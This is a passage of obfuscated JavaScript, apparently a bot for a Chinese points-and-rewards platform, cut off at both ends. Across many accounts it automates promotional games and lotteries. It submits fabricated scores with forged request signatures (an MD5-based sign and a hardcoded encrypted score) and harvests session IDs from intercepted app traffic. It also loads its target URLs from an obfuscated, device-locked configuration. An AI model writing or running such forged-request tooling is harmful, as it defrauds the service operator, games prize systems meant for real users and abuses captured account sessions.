      for (let _0x5ece34 = 0; _0x5ece34 < _0x4127e3?.["leftEnergyBall"] ?? 0; _0x5ece34++) {
        _0x26e935 = await this.getToken(_0x4e3066);
        _0x163a69 = dealToken(_0x26e935, _0x2631b1);
        let _0xac8585 = await this.UseEnergyBall(_0x4e3066, _0x163a69);
        if (_0xac8585?.["code"] == 500052) {
          console.log("账号" + this.index + "果园 果实成熟 收取");
          _0x26e935 = await this.getToken(_0x4e3066);
          _0x163a69 = dealToken(_0x26e935, _0x2631b1);
          await this.CollectCoconut(_0x4e3066, _0x163a69);
          break;
        } else {
          if (_0xac8585?.["code"] == 500051) {
            break;
          }
        }
      }
      console.log("收集明信片");
      let _0x5f54e3 = (await this.postCardInfo(_0x4e3066)).data,
        _0x28ed98 = _0x5f54e3.claimPrizeMap,
        _0x39467d = {};
      for (let _0x19dd67 = 1; _0x19dd67 <= 5; ++_0x19dd67) {
        _0x39467d[_0x19dd67] = 0;
      }
      for (let _0x3bef37 in _0x5f54e3.cardMap) {
        let _0x551f51 = _0x3bef37.split("_")[2];
        if (_0x5f54e3.cardMap[_0x3bef37] == 1 && _0x551f51 in _0x39467d) {
          _0x39467d[_0x551f51]++;
        }
      }
      for (let _0x344471 = 1; _0x344471 <= 5; ++_0x344471) {
        if (_0x39467d[_0x344471] < 6 || _0x344471 in _0x28ed98) {
          delete _0x39467d[_0x344471];
        }
      }
      console.log("可收集明星片", Object.keys(_0x39467d));
      for (let _0x5cf8cc in _0x39467d) {
        console.log("收集明信片" + _0x5cf8cc);
        _0x26e935 = await this.getToken(_0x4e3066);
        _0x163a69 = dealToken(_0x26e935, _0x2631b1);
        await this.postCardClaimPrize(_0x4e3066, _0x5cf8cc, _0x163a69);
      }
    } catch (_0xad9778) {
      console.log(_0xad9778);
    }
  }
  async IndexGame(_0x549e0e) {
    let _0x3dd660 = "https://" + DUIBAURL + "/aaw/underseaGame/index?opId=" + _0x549e0e + "&from=login&spm=89420.1.1.1",
      _0x430b22 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x4d52f5 = await got.get(_0x3dd660, _0x430b22).text();
    return _0x4d52f5;
  }
  async GetInfoGame(_0x52b88b) {
    let _0xc0ea04 = "https://" + DUIBAURL + "/aaw/underseaGame/getInfo?__ts__=" + Date.now() + "&opId=" + _0x52b88b,
      _0xb5eff4 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      };
    let _0x49e1d7 = await got.get(_0xc0ea04, _0xb5eff4).json();
    return _0x49e1d7?.["data"];
  }
  async StartGame(_0x4e4c40) {
    let _0x5b60e6 = "https://" + DUIBAURL + "/aaw/underseaGame/start?__ts__=" + Date.now();
    let _0x26bbd0 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "opId=" + _0x4e4c40
      },
      _0x1ccd94 = await got.post(_0x5b60e6, _0x26bbd0).json();
    console.log(_0x1ccd94);
    return _0x1ccd94?.["data"];
  }
  async getOrderStatusGame(_0x4b4e24, _0x4c8ae5, _0x3989a8) {
    let _0x3384e2 = "https://" + DUIBAURL + "/aaw/underseaGame/getOrderStatus?__ts__=" + Date.now() + "&opId=" + _0x4b4e24 + "&startId=" + _0x4c8ae5 + "&orderNum=" + _0x3989a8 + "&type=1";
    let _0x39da3e = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x3e380c = await got.get(_0x3384e2, _0x39da3e).json();
    console.log(_0x3e380c);
    return _0x3e380c?.["data"];
  }
  async StartRound(_0x561128, _0x5027a5, _0x1aa6b4) {
    let _0x2dc64b = "https://" + DUIBAURL + "/aaw/underseaGame/startRound?__ts__=" + Date.now(),
      _0xeb9c03 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "opId=" + _0x561128 + "&startId=" + _0x5027a5 + "&roundIndex=" + _0x1aa6b4
      },
      _0x8bf78a = await got.post(_0x2dc64b, _0xeb9c03).json();
    console.log(_0x8bf78a);
    return _0x8bf78a?.["data"];
  }
  async SubmitGame(_0x1900ae, _0x1d1fc6, _0x5d0cdf, _0x1bcf97, _0x47bc5a, _0x4eea66) {
    let _0x2e287f = "https://" + DUIBAURL + "/aaw/underseaGame/submit?__ts__=" + Date.now(),
      _0x5e0d94 = "opId=" + _0x1900ae + "&startId=" + _0x1d1fc6 + "&score=" + _0x5d0cdf + "&totalScore=" + _0x1bcf97 + "&roundIndex=" + _0x47bc5a,
      _0x4904b2 = GameSign(_0x5e0d94, _0x4eea66),
      _0x471bf1 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: _0x5e0d94 + "&sign=" + _0x4904b2
      };
    let _0x445b3f = await got.post(_0x2e287f, _0x471bf1).json();
    console.log(_0x445b3f);
    return _0x445b3f?.["data"];
  }
  async DrawGame(_0x4d822d, _0x3a09b1, _0x16aa0f) {
    let _0x208d6c = "https://" + DUIBAURL + "/aaw/underseaGame/draw?__ts__=" + Date.now();
    let _0x514cb8 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "opId=" + _0x4d822d + "&startId=" + _0x3a09b1 + "&roundIndex=" + _0x16aa0f
      },
      _0x3f3c10 = await got.post(_0x208d6c, _0x514cb8).json();
    console.log(_0x3f3c10);
    return _0x3f3c10?.["data"];
  }
  async Click() {
    let _0x5b7149 = "https://" + DUIBAURL + "/log/click?__ts__=" + Date.now() + "&dpm=89420.258.1.1&dcm=&appId=89420",
      _0x303585 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x121c47 = await got.get(_0x5b7149, _0x303585);
    console.log(_0x121c47.text);
  }
  async duibaSeaGame() {
    try {
      let _0x4f4ec2 = "202214587511596",
        _0xf4ae04 = await this.IndexGame(_0x4f4ec2),
        _0xa0cdc8 = ParseHtmlGame(_0xf4ae04),
        _0x55ef76 = _0xa0cdc8.key,
        _0x1c4f38 = await this.GetInfoGame(_0x4f4ec2),
        _0x2cfc2c = false;
      console.log("免费次数");
      for (let _0x772285 = 0; _0x772285 < _0x1c4f38?.["remainingFreeTimes"] ?? 0; _0x772285++) {
        if (_0x772285 > 0) {
          await $.wait(60000);
        }
        let _0x1f7e83 = 3;
        await this.Click();
        let _0x260fd7 = await this.StartGame(_0x4f4ec2),
          _0x1ee3a2 = _0x260fd7.startId,
          _0x5dd883 = _0x260fd7.orderNum;
        if (!_0x1ee3a2 || !_0x5dd883) {
          break;
        }
        let _0x23aceb,
          _0x1f7000 = 0;
        const _0xb47688 = 10;
        do {
          _0x23aceb = await this.getOrderStatusGame(_0x4f4ec2, _0x1ee3a2, _0x5dd883);
          await $.wait(4000);
          _0x1f7000++;
        } while (_0x23aceb !== 2 && _0x1f7000 < _0xb47688);
        if (_0x23aceb !== 2) {
          continue;
        }
        let _0x438018 = [];
        for (let _0x11b008 = 1; _0x11b008 <= _0x1f7e83; _0x11b008++) {
          _0x438018.push(_0x11b008);
          await this.StartRound(_0x4f4ec2, _0x1ee3a2, _0x11b008);
          let _0x5bb4a5 = _0x11b008 * 5,
            _0x35cc31 = _0x438018.reduce((_0x51ca96, _0x1700f9) => _0x51ca96 + 5 * (_0x1700f9 - 1), _0x5bb4a5);
          await $.wait(_0x11b008 * 35000);
          await this.SubmitGame(_0x4f4ec2, _0x1ee3a2, _0x5bb4a5, _0x35cc31, _0x11b008, _0x55ef76);
          let _0x4cdc3c = await this.DrawGame(_0x4f4ec2, _0x1ee3a2, _0x11b008);
          !_0x2cfc2c && _0x4cdc3c.type !== "thanks" && (console.log("海岛今天有奖励 运行积分次数"), _0x2cfc2c = true);
        }
        await $.wait(10000);
      }
      if (!_0x2cfc2c) {
        return;
      }
      console.log("积分参与次数");
      if (_0x1c4f38.remainingLimitTimes <= 0) {
        return;
      }
      await $.wait(60000);
      for (let _0x4b5a3a = 0; _0x4b5a3a < _0x1c4f38?.["remainingLimitTimes"] ?? 0; _0x4b5a3a++) {
        if (_0x4b5a3a > 0) {
          await $.wait(60000);
        }
        let _0x264ac6 = 3;
        await this.Click();
        let _0x1e119d = await this.StartGame(_0x4f4ec2),
          _0x3b9ee8 = _0x1e119d.startId,
          _0x52bf2c = _0x1e119d.orderNum;
        if (!_0x3b9ee8 || !_0x52bf2c) {
          break;
        }
        let _0x3d14ba,
          _0xd47ec0 = 0;
        const _0x267045 = 10;
        do {
          _0x3d14ba = await this.getOrderStatusGame(_0x4f4ec2, _0x3b9ee8, _0x52bf2c);
          await $.wait(4000);
          _0xd47ec0++;
        } while (_0x3d14ba !== 2 && _0xd47ec0 < _0x267045);
        if (_0x3d14ba !== 2) {
          continue;
        }
        let _0x11f084 = [];
        for (let _0x3719f9 = 1; _0x3719f9 <= _0x264ac6; _0x3719f9++) {
          _0x11f084.push(_0x3719f9);
          await this.StartRound(_0x4f4ec2, _0x3b9ee8, _0x3719f9);
          let _0xcecf72 = _0x3719f9 * 5,
            _0x46252e = _0x11f084.reduce((_0x26ffee, _0xa246aa) => _0x26ffee + 5 * (_0xa246aa - 1), _0xcecf72);
          await $.wait(_0x3719f9 * 35000);
          await this.SubmitGame(_0x4f4ec2, _0x3b9ee8, _0xcecf72, _0x46252e, _0x3719f9, _0x55ef76);
          await this.DrawGame(_0x4f4ec2, _0x3b9ee8, _0x3719f9);
        }
      }
    } catch (_0x56935d) {
      console.log(_0x56935d);
    }
  }
  async IndexGameSsp(_0x60cf0a) {
    let _0x213dae = "https://" + DUIBAURL + "/aaw/superSurprise/index?id=" + _0x60cf0a + "&from=login&spm=89420.1.1.1";
    let _0xa8b126 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x21aa68 = await got.get(_0x213dae, _0xa8b126).text();
    return _0x21aa68;
  }
  async GetInfoGameSsp(_0xd646e3) {
    let _0x1ba847 = "https://" + DUIBAURL + "/aaw/superSurprise/getActivityInfo?_=" + Date.now() + "&id=" + _0xd646e3,
      _0x1e44c3 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x333b2f = await got.get(_0x1ba847, _0x1e44c3).json();
    return _0x333b2f?.["data"];
  }
  async StartGameSsp(_0x2b32b2) {
    let _0x2d981b = "https://" + DUIBAURL + "/aaw/superSurprise/doJoin?_=" + Date.now();
    let _0x1f6027 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "id=" + _0x2b32b2
      },
      _0x262e3d = await got.post(_0x2d981b, _0x1f6027).json();
    console.log(_0x262e3d);
    return _0x262e3d?.["data"];
  }
  async JoinRecordStatusSsp(_0x8a4b08) {
    let _0x334cd7 = "https://" + DUIBAURL + "/aaw/superSurprise/joinRecordStatus?_=" + Date.now() + "&id=" + _0x8a4b08;
    let _0x53dc5a = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x389961 = await got.get(_0x334cd7, _0x53dc5a).json();
    console.log(_0x389961);
    return _0x389961?.["data"];
  }
  async SubmitGameSsp(_0x4e413d, _0x59d30d) {
    let _0x3fbe67 = Date.now(),
      _0x26c58d = "https://" + DUIBAURL + "/aaw/superSurprise/submit?_=" + _0x3fbe67,
      _0x2ecfb8 = 27,
      _0x24e772 = "ZfVax7VVWgRyZFhhLEe9rz9mvcTb86Z1lF++fvAf7ptNRsrKUbeCIJzG4Y2L9EFqEo845qT5Gtl/frY/vZ+ZXWkQUqAM68/V7rNIgEixLzj7mhuAkUCBQyrT4Yn4GZ5NX3zaAkF2tOD/4HkqJYCPLeFO5Ga0quIvDWxqzVYhuYoa7kuCgY8gSF4YKCDhlROnFapbeMckR2a6xACV5TVxzj2OMTAlXD5mdAtFX+64s/EVp7mfPH3B5fIu55rNmnNnUMwccwqGdi7Fl/wQKt48FeSA3LXXpI1VitOvUIDZ7z5Qd4n5jrzKTNdPG1dzn8IOTTw9PD7vIID/4I+LFSj4zw==";
    let _0x159ad8 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/json"
        },
        cookieJar: this.duibaCookieJar,
        json: {
          activityId: _0x59d30d.toString(),
          recordId: _0x4e413d,
          score: _0x24e772,
          sign: MD5Encrypt("".concat(_0x2ecfb8).concat(_0x3fbe67).concat(_0x3fbe67.toString(16))),
          timestamp: _0x3fbe67
        }
      },
      _0x465200 = await got.post(_0x26c58d, _0x159ad8).json();
    console.log(_0x465200);
    return _0x465200?.["data"];
  }
  async duibaGameSsp() {
    try {
      let _0xe7244d = "85",
        _0x4bd360 = await this.GetInfoGameSsp(_0xe7244d);
      console.log("免费次数");
      for (let _0x4ecf9a = 0; _0x4ecf9a < _0x4bd360?.["remainFreeJoinTimes"] ?? 0; _0x4ecf9a++) {
        if (_0x4ecf9a > 0) {
          await $.wait(60000);
        }
        let _0x571f99 = await this.StartGameSsp(_0xe7244d),
          _0xedcb13 = _0x571f99.recordId;
        if (!_0xedcb13) {
          break;
        }
        let _0x50da2f,
          _0x15d505 = 0,
          _0xb5b55a = 10;
        do {
          let _0x34c178 = await this.JoinRecordStatusSsp(_0xedcb13);
          _0x50da2f = _0x34c178.consumeCreditsStatus;
          await $.wait(4000);
          _0x15d505++;
        } while (_0x50da2f <= 0 && _0x15d505 < _0xb5b55a);
        if (_0x50da2f <= 0) {
          continue;
        }
        await $.wait(40000);
        await this.SubmitGameSsp(_0xedcb13, _0xe7244d);
        await $.wait(1000);
        _0x15d505 = 0;
        _0xb5b55a = 3;
        do {
          let _0x110c9c = await this.JoinRecordStatusSsp(_0xedcb13);
          _0x50da2f = _0x110c9c.exchangeStatus;
          await $.wait(4000);
          _0x15d505++;
        } while (_0x50da2f !== 3 && _0x15d505 < _0xb5b55a);
      }
      console.log("积分参与次数");
    } catch (_0x5d37ac) {
      console.log(_0x5d37ac);
    }
  }
  async IndexLM(_0x31a211) {
    let _0x5630b9 = "https://" + DUIBAURL + "/hdtool/index?id=" + _0x31a211 + "&from=login&spm=89420.1.1.1",
      _0x148e92 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x58caf3 = await got.post(_0x5630b9, _0x148e92).text();
    return _0x58caf3;
  }
  async AjaxElement(_0x3b4e25) {
    let _0x31d564 = "https://" + DUIBAURL + "/hdtool/ajaxElement?_=" + Date.now() + "8",
      _0xbba815 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "hdType=dev&hdToolId=&preview=false&actId=" + _0x3b4e25 + "&adslotId="
      },
      _0x557242 = await got.post(_0x31d564, _0xbba815).json();
    return _0x557242;
  }
  async isShow(_0xe9da92) {
    let _0x11ff53 = "https://" + DUIBAURL + "/customerService/isShow?_=" + Date.now(),
      _0x2c24d6 = {
        headers: {
          Host: DUIBAURL,
          Accept: "application/json",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "pageId=" + _0xe9da92
      },
      _0x464d89 = await got.post(_0x11ff53, _0x2c24d6).json();
    console.log(_0x464d89);
  }
  async GetHdtoolConfig(_0x37a6a6) {
    let _0x390669 = "https://" + DUIBAURL + "/hdtool/getHdtoolConfig?_=" + Date.now(),
      _0x3fc9fe = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "actId=" + _0x37a6a6 + "&hdType=dev&hdToolId=\n"
      },
      _0xe93dfa = await got.post(_0x390669, _0x3fc9fe).json();
    return _0xe93dfa;
  }
  async getTokenNew(_0x3ca6e2, _0x198c8e) {
    let _0x4b6d33 = "https://" + DUIBAURL + "/hdtool/ctoken/getTokenNew",
      _0x5a58d7 = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          "X-Requested-With": "XMLHttpRequest",
          Accept: "application/json",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          Referer: "https://" + DUIBAURL + "/hdtool/index?id=202214172275896&from=login&spm=89420.1.1.1",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "timestamp=" + Date.now() + "&activityId=" + _0x3ca6e2 + "&activityType=hdtool&consumerId=" + _0x198c8e
      },
      _0x37b0d0 = await got.post(_0x4b6d33, _0x5a58d7).json();
    return _0x37b0d0.token;
  }
  async doJoin(_0x18a0d7, _0x598731, _0x1b4876) {
    let _0x25c6fc = "https://" + DUIBAURL + "/hdtool/doJoin?dpm=89420.3.1.0&activityId=" + _0x18a0d7 + "&_=" + Date.now(),
      _0x401c57 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "actId=" + _0x18a0d7 + "&oaId=" + _0x18a0d7 + "&activityType=hdtool&consumerId=" + _0x598731 + "&token=" + _0x1b4876
      },
      _0x430336 = await got.post(_0x25c6fc, _0x401c57).json();
    console.log(_0x430336);
    return _0x430336;
  }
  async getOrderStatus(_0x1137bd) {
    let _0x450deb = "https://" + DUIBAURL + "/hdtool/getOrderStatus?_=" + Date.now(),
      _0x396679 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "orderId=" + _0x1137bd + "&adslotId="
      },
      _0x472647 = await got.post(_0x450deb, _0x396679).json();
    console.log(_0x472647);
    return _0x472647;
  }
  async duibaLotteryMachine() {
    try {
      if (!LotteryMachineSwitch) {
        return;
      }
      let _0x1aa9a3 = "202214172275896",
        _0x45afc9 = await this.IndexLM(_0x1aa9a3),
        _0x36a203 = ParseHtml(_0x45afc9, 5),
        _0x5ab378 = _0x36a203.cid,
        _0xde1edd = _0x36a203.tokenKey,
        _0x1264c3 = _0x36a203.defaultToken;
      await this.AjaxElement(_0x1aa9a3);
      await this.isShow(4);
      await this.GetHdtoolConfig(_0x1aa9a3);
      await $.wait(1000);
      let _0x2ef306 = await this.getTokenNew(_0x1aa9a3, _0x5ab378),
        _0x4986a5 = dealToken2(_0x2ef306, _0xde1edd) ?? _0x1264c3,
        _0x42181f = await this.doJoin(_0x1aa9a3, _0x5ab378, _0x4986a5);
      console.log("花费" + _0x42181f.needCredits + "积分 抽奖");
      _0x42181f = _0x42181f.orderId;
      while (true) {
        if (!_0x42181f) {
          break;
        }
        let _0x306b24 = await this.getOrderStatus(_0x42181f);
        if (_0x306b24.result !== 0) {
          break;
        }
        await $.wait(1000);
      }
    } catch (_0x1fbe99) {
      console.log(_0x1fbe99);
    }
  }
}
let arrs;
!(async () => {
  if (!(typeof $request !== "undefined")) {
    initVM();
    arrs = abc(global.vm, acckey, mac, 83, 0);
    if (!arrs) {
      return;
    }
    arrs = JSON.parse(arrs);
    KWWURL = arrs?.["u1"];
    DUIBAURL = arrs?.["u2"];
    p1 = arrs?.["p1"];
    p2 = arrs?.["p2"];
    p3 = arrs?.["p3"];
    dd = arrs?.["d"];
    ReadAnswerDict();
    if (!(await checkEnv())) {
      return;
    }
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    console.log("------------- 共" + userList.length + "个账号-------------\n");
    if (userList.length > arrs.num) {
      process.exit(0);
    }
    for (let _0x19b4e1 of userList) {
      await _0x19b4e1.run();
    }
  }
})().catch(_0x139838 => console.log(_0x139838)).finally(() => {
  $.done();
});
async function GetRewrite() {
  if ($request.url.indexOf("job/listJob.json") > -1) {
    let _0x30a408 = $request.url.split("sessionId=")[1];
    userCookie ? userCookie.indexOf(_0x30a408) == -1 && (userCookie = userCookie + "@" + _0x30a408, $.setdata(userCookie, "jjyCookie"), ckList = userCookie.split("@"), $.msg(jsname + (" 获取第" + ckList.length + "个ck成功: " + _0x30a408))) : ($.setdata(_0x30a408, "jjyCookie"), $.msg(jsname + (" 获取第1个ck成功: " + _0x30a408)));
  }
}
async function checkEnv() {
  if (userCookie) {
    let _0x7bedc = envSplitor[0];
    for (let _0x18739e of envSplitor) {
      if (userCookie.indexOf(_0x18739e) > -1) {
        _0x7bedc = _0x18739e;
        break;
      }
    }
    for (let _0x370520 of userCookie.split(_0x7bedc).filter(_0x5c0600 => _0x5c0600.trim())) {
      if (_0x370520) {
        userList.push(new UserInfo(_0x370520));
      }
    }
    userCount = userList.length;
    console.log("共找到" + userCount + "个账号");
    return true;
  } else {
    console.log("未找到CK");
    return false;
  }
}
function populateUrlObject(url, body = "") {
  let host = url.replace("//", "/").split("/")[1];
  let urlObject = {
    url: url,
    headers: {
      Host: host,
      Connection: "keep-alive"
    },
    timeout: 5000
  };
  if (body) {
    urlObject.body = body;
    urlObject.headers["Content-Type"] = "application/json; charset=utf-8";
  }
  return urlObject;
}
async function httpRequest(method, url) {
  httpResult = null;
  httpReq = null;
  httpResp = null;
  return new Promise(resolve => {
    $.send(method, url, async (err, req, resp) => {
      try {
        httpReq = req;
        httpResp = resp;
        if (err) {
          console.log(`${method}请求失败`);
          console.log(JSON.stringify(err));
        } else {
          if (resp.body) {
            if (typeof resp.body == "object") {
              httpResult = resp.body;
            } else {
              try {
                httpResult = JSON.parse(resp.body);
              } catch (e) {}
            }
          }
        }
      } catch (e) {
        console.log(e);
      } finally {
        resolve();
      }
    });
  });
}
var Base64 = {
  _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
  encode: function (e) {
    var t = "";
    var n, r, i, s, o, u, a;
    var f = 0;
    e = Base64._utf8_encode(e);
    while (f < e.length) {
      n = e.charCodeAt(f++);
      r = e.charCodeAt(f++);
      i = e.charCodeAt(f++);
      s = n >> 2;
      o = (n & 3) << 4 | r >> 4;
      u = (r & 15) << 2 | i >> 6;
      a = i & 63;
      if (isNaN(r)) {
        u = a = 64;
      } else {
        if (isNaN(i)) {
          a = 64;
        }
      }
      t = t + this._keyStr.charAt(s) + this._keyStr.charAt(o) + this._keyStr.charAt(u) + this._keyStr.charAt(a);
    }
    return t;
  },
  decode: function (e) {
    var t = "";
    var n, r, i;
    var s, o, u, a;
    var f = 0;
    e = e.replace(/[^A-Za-z0-9+/=]/g, "");
    while (f < e.length) {
      s = this._keyStr.indexOf(e.charAt(f++));
      o = this._keyStr.indexOf(e.charAt(f++));
      u = this._keyStr.indexOf(e.charAt(f++));
      a = this._keyStr.indexOf(e.charAt(f++));
      n = s << 2 | o >> 4;
      r = (o & 15) << 4 | u >> 2;
      i = (u & 3) << 6 | a;
      t = t + String.fromCharCode(n);
      if (u != 64) {
        t = t + String.fromCharCode(r);
      }
      if (a != 64) {
        t = t + String.fromCharCode(i);
      }
    }
    t = Base64._utf8_decode(t);
    return t;
  },
  _utf8_encode: function (e) {
    e = e.replace(/rn/g, "n");
    var t = "";
    for (var n = 0; n < e.length; n++) {
      var r = e.charCodeAt(n);
      if (r < 128) {
        t += String.fromCharCode(r);
      } else {
        if (r > 127 && r < 2048) {
          t += String.fromCharCode(r >> 6 | 192);
          t += String.fromCharCode(r & 63 | 128);
        } else {
          t += String.fromCharCode(r >> 12 | 224);
          t += String.fromCharCode(r >> 6 & 63 | 128);
          t += String.fromCharCode(r & 63 | 128);
        }
      }
    }
    return t;
  },
  _utf8_decode: function (e) {
    var t = "";
    var n = 0;
    c1 = c2 = 0;
    var r = c1;
    while (n < e.length) {
      r = e.charCodeAt(n);
      if (r < 128) {
        t += String.fromCharCode(r);
        n++;
      } else {
        if (r > 191 && r < 224) {
          c2 = e.charCodeAt(n + 1);
          t += String.fromCharCode((r & 31) << 6 | c2 & 63);
          n += 2;
        } else {
          c2 = e.charCodeAt(n + 1);
          c3 = e.charCodeAt(n + 2);
          t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
          n += 3;
        }
      }
    }
    return t;
  }
};
function MD5Encrypt(a) {
  function b(a, b) {
    return a << b | a >>> 32 - b;
  }
  function c(a, b) {
    var c, d, e, f, g;
    e = 2147483648 & a;
    f = 2147483648 & b;
    c = 1073741824 & a;
    d = 1073741824 & b;
    g = (1073741823 & a) + (1073741823 & b);
    return c & d ? 2147483648 ^ g ^ e ^ f : c | d ? 1073741824 & g ? 3221225472 ^ g ^ e ^ f : 1073741824 ^ g ^ e ^ f : g ^ e ^ f;
  }
  function d(a, b, c) {
    return a & b | ~a & c;
  }
  function e(a, b, c) {
    return a & c | b & ~c;
  }
  function f(a, b, c) {
    return a ^ b ^ c;
  }
  function g(a, b, c) {
    return b ^ (a | ~c);
  }
  function h(a, e, f, g, h, i, j) {
    a = c(a, c(c(d(e, f, g), h), j));
    return c(b(a, i), e);
  }
